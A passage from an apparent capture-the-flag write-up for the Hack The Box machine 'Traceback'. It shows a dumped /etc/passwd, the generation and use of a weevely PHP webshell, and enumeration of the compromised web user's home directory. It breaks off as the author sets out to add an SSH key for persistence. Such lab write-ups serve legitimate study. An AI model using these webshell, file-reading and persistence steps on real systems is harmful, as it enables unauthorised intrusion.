</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>root</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=mi>0</span><span class=p>:</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>root</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>daemon</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=n>daemon</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>bin</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=mi>2</span><span class=p>:</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sys</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=n>sys</span><span class=p>:</span><span class=o>/</span><span class=n>dev</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sync</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>4</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>sync</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sync</span>
</span></span><span class=line><span class=cl><span class=n>games</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>5</span><span class=p>:</span><span class=mi>60</span><span class=p>:</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>games</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>man</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>6</span><span class=p>:</span><span class=mi>12</span><span class=p>:</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>cache</span><span class=o>/</span><span class=n>man</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>lp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=n>lp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>lpd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>mail</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=mi>8</span><span class=p>:</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>mail</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>news</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=mi>9</span><span class=p>:</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>news</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>uucp</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>uucp</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>proxy</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=mi>13</span><span class=p>:</span><span class=n>proxy</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=mi>33</span><span class=p>:</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>backup</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=mi>34</span><span class=p>:</span><span class=n>backup</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>backups</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>list</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=n>Mailing</span> <span class=n>List</span> <span class=n>Manager</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>list</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>irc</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>ircd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>gnats</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=mi>41</span><span class=p>:</span><span class=n>Gnats</span> <span class=n>Bug</span><span class=o>-</span><span class=n>Reporting</span> <span class=n>System</span> <span class=p>(</span><span class=n>admin</span><span class=p>):</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>gnats</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>nobody</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=mi>65534</span><span class=p>:</span><span class=n>nobody</span><span class=p>:</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>network</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>100</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Network</span> <span class=n>Management</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=o>/</span><span class=n>netif</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>systemd</span><span class=o>-</span><span class=n>resolve</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>101</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=n>systemd</span> <span class=n>Resolver</span><span class=p>,,,:</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>systemd</span><span class=o>/</span><span class=n>resolve</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>syslog</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>102</span><span class=p>:</span><span class=mi>106</span><span class=p>::</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>syslog</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>messagebus</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>103</span><span class=p>:</span><span class=mi>107</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>_apt</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>104</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=n>nonexistent</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>uuidd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>105</span><span class=p>:</span><span class=mi>109</span><span class=p>::</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>uuidd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>webadmin</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1000</span><span class=p>:</span><span class=mi>1000</span><span class=p>:</span><span class=n>traceback</span><span class=p>,,,:</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>webadmin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
</span></span><span class=line><span class=cl><span class=n>sshd</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>106</span><span class=p>:</span><span class=mi>65534</span><span class=p>::</span><span class=o>/</span><span class=n>run</span><span class=o>/</span><span class=n>sshd</span><span class=p>:</span><span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>sbin</span><span class=o>/</span><span class=n>nologin</span>
</span></span><span class=line><span class=cl><span class=n>sysadmin</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>1001</span><span class=p>:</span><span class=mi>1001</span><span class=p>::</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>sysadmin</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span>
</span></span></code></pre></td></tr></table></div></div><p>The webshell is a cancer, so let&rsquo;s create & upload our own made with <a href=https://github.com/epinna/weevely3>weevely</a>.</p><p>Create teh webshell agent:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ weevely generate cyfun agentcyfun.php
</span></span><span class=line><span class=cl>Generated &#39;agentcyfun.php&#39; with password &#39;cyfun&#39; of 781 byte size.
</span></span></code></pre></td></tr></table></div></div><p>Upload the agent (a classic HTTP server + wget).
Trigger the webshell agent:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ weevely terminal http://10.10.10.181/agentcyfun.php cyfun
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[+] weevely 4.0.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[+] Target:     10.10.10.181
</span></span><span class=line><span class=cl>[+] Session:    /home/cyfun/.weevely/sessions/10.10.10.181/agentcyfun_0.session
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[+] Browse the filesystem or execute commands starts the connection
</span></span><span class=line><span class=cl>[+] to the target. Type :help for more information.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>weevely&gt; id
</span></span><span class=line><span class=cl>uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
</span></span></code></pre></td></tr></table></div></div><h2 id=system-enumeration>System enumeration<a hidden class=anchor aria-hidden=true href=#system-enumeration>#</a></h2><p>Then start some system enumeration.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>webadmin</span><span class=err>@</span><span class=n>traceback</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span> <span class=o>$</span> <span class=n>ls</span> <span class=o>-</span><span class=n>lhRA</span> <span class=o>/</span><span class=n>home</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>home</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>total</span> <span class=mf>8.0</span><span class=n>K</span>
</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>x</span><span class=o>---</span> <span class=mi>5</span> <span class=n>sysadmin</span> <span class=n>sysadmin</span> <span class=mf>4.0</span><span class=n>K</span> <span class=n>Mar</span> <span class=mi>15</span> <span class=mi>09</span><span class=p>:</span><span class=mi>07</span> <span class=n>sysadmin</span>
</span></span><span class=line><span class=cl><span class=n>drwxr</span><span class=o>-</span><span class=n>x</span><span class=o>---</span> <span class=mi>5</span> <span class=n>webadmin</span> <span class=n>sysadmin</span> <span class=mf>4.0</span><span class=n>K</span> <span class=n>Mar</span> <span class=mi>15</span> <span class=mi>09</span><span class=p>:</span><span class=mi>08</span> <span class=n>webadmin</span>
</span></span><span class=line><span class=cl><span class=n>ls</span><span class=p>:</span> <span class=n>cannot</span> <span class=n>open</span> <span class=n>directory</span> <span class=s1>&#39;/home/sysadmin&#39;</span><span class=p>:</span> <span class=n>Permission</span> <span class=n>denied</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>webadmin</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>total</span> <span class=mf>4.3</span><span class=n>M</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-------</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span>   <span class=mi>90</span> <span class=n>Feb</span> <span class=mi>27</span> <span class=mi>05</span><span class=p>:</span><span class=mi>53</span> <span class=o>.</span><span class=n>bash_history</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span>  <span class=mi>220</span> <span class=n>Aug</span> <span class=mi>23</span>  <span class=mi>2019</span> <span class=o>.</span><span class=n>bash_logout</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span> <span class=mf>3.7</span><span class=n>K</span> <span class=n>Aug</span> <span class=mi>23</span>  <span class=mi>2019</span> <span class=o>.</span><span class=n>bashrc</span>
</span></span><span class=line><span class=cl><span class=n>drwx</span><span class=o>------</span> <span class=mi>2</span> <span class=n>webadmin</span> <span class=n>webadmin</span> <span class=mf>4.0</span><span class=n>K</span> <span class=n>Aug</span> <span class=mi>23</span>  <span class=mi>2019</span> <span class=o>.</span><span class=n>cache</span>
</span></span><span class=line><span class=cl><span class=n>drwxrwxr</span><span class=o>-</span><span class=n>x</span> <span class=mi>3</span> <span class=n>webadmin</span> <span class=n>webadmin</span> <span class=mf>4.0</span><span class=n>K</span> <span class=n>Aug</span> <span class=mi>24</span>  <span class=mi>2019</span> <span class=o>.</span><span class=n>local</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span>    <span class=mi>1</span> <span class=n>Aug</span> <span class=mi>25</span>  <span class=mi>2019</span> <span class=o>.</span><span class=n>luvit_history</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span>  <span class=mi>807</span> <span class=n>Aug</span> <span class=mi>23</span>  <span class=mi>2019</span> <span class=o>.</span><span class=n>profile</span>
</span></span><span class=line><span class=cl><span class=n>drwxrwxr</span><span class=o>-</span><span class=n>x</span> <span class=mi>2</span> <span class=n>webadmin</span> <span class=n>webadmin</span> <span class=mf>4.0</span><span class=n>K</span> <span class=n>Feb</span> <span class=mi>27</span> <span class=mi>06</span><span class=p>:</span><span class=mi>29</span> <span class=o>.</span><span class=n>ssh</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rwxrw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span>  <span class=mi>870</span> <span class=n>Mar</span> <span class=mi>15</span> <span class=mi>09</span><span class=p>:</span><span class=mi>05</span> <span class=n>cc</span><span class=o>.</span><span class=n>lua</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rwxrw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span>  <span class=mi>332</span> <span class=n>Mar</span> <span class=mi>15</span> <span class=mi>09</span><span class=p>:</span><span class=mi>02</span> <span class=n>ccc</span><span class=o>.</span><span class=n>lua</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>rw</span><span class=o>-</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span>  <span class=mi>672</span> <span class=n>Mar</span> <span class=mi>15</span> <span class=mi>08</span><span class=p>:</span><span class=mi>49</span> <span class=n>heli</span><span class=o>.</span><span class=n>lua</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span>  <span class=mi>672</span> <span class=n>Mar</span> <span class=mi>15</span> <span class=mi>09</span><span class=p>:</span><span class=mi>04</span> <span class=n>krisis</span><span class=o>.</span><span class=n>lua</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rwxrwxr</span><span class=o>-</span><span class=n>x</span> <span class=mi>1</span> <span class=n>sysadmin</span> <span class=n>sysadmin</span> <span class=mf>4.2</span><span class=n>M</span> <span class=n>Aug</span> <span class=mi>24</span>  <span class=mi>2019</span> <span class=n>luvit</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span>   <span class=mi>89</span> <span class=n>Aug</span> <span class=mi>24</span>  <span class=mi>2019</span> <span class=n>note</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span>  <span class=mi>654</span> <span class=n>Mar</span> <span class=mi>15</span> <span class=mi>09</span><span class=p>:</span><span class=mi>02</span> <span class=n>nowy</span><span class=o>.</span><span class=n>lua</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span>  <span class=mi>648</span> <span class=n>Mar</span> <span class=mi>15</span> <span class=mi>09</span><span class=p>:</span><span class=mi>06</span> <span class=n>privesc</span><span class=o>.</span><span class=n>lua</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span>  <span class=mi>673</span> <span class=n>Mar</span> <span class=mi>15</span> <span class=mi>09</span><span class=p>:</span><span class=mi>03</span> <span class=n>rs</span><span class=o>.</span><span class=n>lua</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span>  <span class=mi>332</span> <span class=n>Mar</span> <span class=mi>15</span> <span class=mi>09</span><span class=p>:</span><span class=mi>02</span> <span class=n>shell</span><span class=o>.</span><span class=n>lua</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span>  <span class=mi>655</span> <span class=n>Mar</span> <span class=mi>15</span> <span class=mi>09</span><span class=p>:</span><span class=mi>08</span> <span class=n>ssh</span><span class=o>.</span><span class=n>lua</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>rw</span><span class=o>-</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span>   <span class=mi>29</span> <span class=n>Mar</span> <span class=mi>15</span> <span class=mi>09</span><span class=p>:</span><span class=mi>06</span> <span class=n>test</span><span class=o>.</span><span class=n>lua</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>webadmin</span><span class=o>/.</span><span class=n>cache</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>total</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-</span><span class=n>r</span><span class=o>--</span><span class=n>r</span><span class=o>--</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span> <span class=mi>0</span> <span class=n>Aug</span> <span class=mi>23</span>  <span class=mi>2019</span> <span class=n>motd</span><span class=o>.</span><span class=n>legal</span><span class=o>-</span><span class=n>displayed</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>webadmin</span><span class=o>/.</span><span class=n>local</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>total</span> <span class=mf>4.0</span><span class=n>K</span>
</span></span><span class=line><span class=cl><span class=n>drwx</span><span class=o>------</span> <span class=mi>3</span> <span class=n>webadmin</span> <span class=n>webadmin</span> <span class=mf>4.0</span><span class=n>K</span> <span class=n>Aug</span> <span class=mi>24</span>  <span class=mi>2019</span> <span class=n>share</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>webadmin</span><span class=o>/.</span><span class=n>local</span><span class=o>/</span><span class=n>share</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>total</span> <span class=mf>4.0</span><span class=n>K</span>
</span></span><span class=line><span class=cl><span class=n>drwx</span><span class=o>------</span> <span class=mi>2</span> <span class=n>webadmin</span> <span class=n>webadmin</span> <span class=mf>4.0</span><span class=n>K</span> <span class=n>Aug</span> <span class=mi>24</span>  <span class=mi>2019</span> <span class=n>nano</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>webadmin</span><span class=o>/.</span><span class=n>local</span><span class=o>/</span><span class=n>share</span><span class=o>/</span><span class=n>nano</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>total</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>webadmin</span><span class=o>/.</span><span class=n>ssh</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>total</span> <span class=mf>4.0</span><span class=n>K</span>
</span></span><span class=line><span class=cl><span class=o>-</span><span class=n>rw</span><span class=o>-------</span> <span class=mi>1</span> <span class=n>webadmin</span> <span class=n>webadmin</span> <span class=mf>1.7</span><span class=n>K</span> <span class=n>Mar</span> <span class=mi>15</span> <span class=mi>09</span><span class=p>:</span><span class=mi>06</span> <span class=n>authorized_keys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>webadmin</span><span class=err>@</span><span class=n>traceback</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span> <span class=o>$</span> <span class=n>cat</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>webadmin</span><span class=o>/</span><span class=n>note</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=o>-</span> <span class=n>sysadmin</span> <span class=o>-</span>
</span></span><span class=line><span class=cl><span class=n>I</span> <span class=n>have</span> <span class=n>left</span> <span class=n>this</span> <span class=k>tool</span> <span class=n>to</span> <span class=n>practice</span> <span class=n>Lua</span><span class=o>.</span> <span class=n>Contact</span> <span class=n>me</span> <span class=k>if</span> <span class=n>you</span> <span class=n>have</span> <span class=n>any</span> <span class=n>question</span><span class=o>.</span>
</span></span></code></pre></td></tr></table></div></div><p>We can see a bunch of lua scripts and a hint telling us to use lua.</p><p>We can edit <code>/home/webadmin/.ssh/authorized_keys</code> and add pubkey to gain
persistence & access a proper TTY rather than a webshell.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
